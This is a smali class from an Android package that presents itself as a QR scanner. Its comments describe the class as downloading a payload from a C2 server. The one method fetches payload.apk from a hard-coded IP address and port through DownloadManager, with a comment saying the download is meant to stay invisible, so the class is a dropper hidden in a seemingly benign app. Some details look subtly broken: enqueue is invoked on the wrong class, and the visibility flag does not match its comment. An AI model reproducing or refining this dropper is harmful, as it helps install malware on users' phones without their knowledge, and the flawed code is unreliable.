.class public Lcom/android/qr/scanner/Downloader;
.super Ljava/lang/Object;
.source "Downloader.java"

# This class downloads the payload from the C2 server

.method public static downloadAndInstall(Landroid/content/Context;)V
    .locals 5
    .param p0, "context"    # Landroid/content/Context;

    # Payload URL
    const-string v0, "http://77.105.133.37:22222/download/payload.apk"
    
    # Download logic using DownloadManager
    const-string v1, "download"
    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v1
    check-cast v1, Landroid/app/DownloadManager;
    
    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v2
    new-instance v3, Landroid/app/DownloadManager$Request;
    invoke-direct {v3, v2}, Landroid/app/DownloadManager$Request;-><init>(Landroid/net/Uri;)V
    
    # Set invisible download
    const/4 v2, 0x0
    invoke-virtual {v3, v2}, Landroid/app/DownloadManager$Request;->setNotificationVisibility(I)Landroid/app/DownloadManager$Request;
    
    invoke-virtual {v1, v3}, Landroid/app/DownloadManager$Request;->enqueue(Landroid/app/DownloadManager$Request;)J
    
    return-void
.end method
